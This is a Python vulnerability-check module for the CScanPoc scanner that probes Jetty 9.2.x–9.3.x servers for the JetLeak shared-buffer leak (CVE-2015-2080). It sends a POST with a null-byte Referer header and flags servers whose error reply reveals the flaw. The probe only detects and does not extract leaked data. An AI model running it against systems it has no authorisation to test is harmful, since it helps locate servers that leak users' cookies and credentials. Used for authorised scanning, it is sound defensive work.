# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import ssl
import sys
import urllib.request
import urllib.parse
import urllib.error
import http.client
import urllib.request
import urllib.error
import urllib.parse
import string
import getopt
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Jetty-Web-Server_0001'  # 平台漏洞编号，留空
    name = 'Jetty Web Server 9.2.x-9.3.x 共享缓存区远程泄露漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-02-24'  # 漏洞公布时间
    desc = '''
            GDS安全公司发现了一个Jetty web server共享缓存区远程泄露漏洞，
            通过该漏洞一个没有认证过的攻击者可以远程获取之前合法用户向服务器发送的请求。
            简而言之，攻击者可以从存在漏洞的服务器远程获取缓存区的敏感信息，
            包括http头的信息（cookies、认证的tokens、防止CSRF的tokens等等）以及用户POST的数据（用户名、密码等）。
            漏洞的根源在于当header中被插入恶意的字符并提交到服务器后，会从异常处理代码中获得共享缓冲区大约16
            bytes的数据。因此攻击者可以通过提交一个精心构造的请求来获取异常并偏移到共享缓冲区中，
            共享缓冲区中存的是用户先前提交的数据，Jetty服务器会根据用户提交的请求返回大约16
            bytes的数据块，这里面会包含敏感信息。
            '''  # 漏洞描述
    ref = '''
            http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2080
            http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html
            https://github.com/GDSSecurity/Jetleak-Testing-Script/blob/master/jetleak_tester.py
            http://bobao.360.cn/news/detail/1251.html
            '''  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-2080'  # cve编号
    product = 'Jetty-Web-Server'  # 漏洞应用名称
    product_version = '9.2.x-9.3.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '36e25628-f881-4b96-8e44-979d8750e932'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        '''
        Github Author: Gotham Digital Science
        Purpose: This tool is intended to provide a quick-and-dirty way for organizations to test whether
                their Jetty web server versions are vulnerable to JetLeak. Currently, this script does
                not handle sites with invalid SSL certs. This will be fixed in a future iteration.
        '''
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            conn = None
            target_pare = urllib.parse.urlparse(self.target)
            port = target_pare.port if target_pare.port else 80
            http_type = target_pare.scheme
            if http_type == "https":
                conn = http.client.HTTPSConnection(self.target, port)
            elif http_type == "http":
                conn = http.client.HTTPConnection(self.target, port)
            else:
                #args['poc_ret']['Error'] = "Error: Only 'http' or 'https' URL Schemes Supported"
                return None

            x = '\x00'
            header = {'Referer': x}
            conn.request('POST', '/', '', header)
            r1 = conn.getresponse()

            if (r1.status == 400 and ("Illegal character 0x0 in state" in r1.reason)):
                #args['success'] = True
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
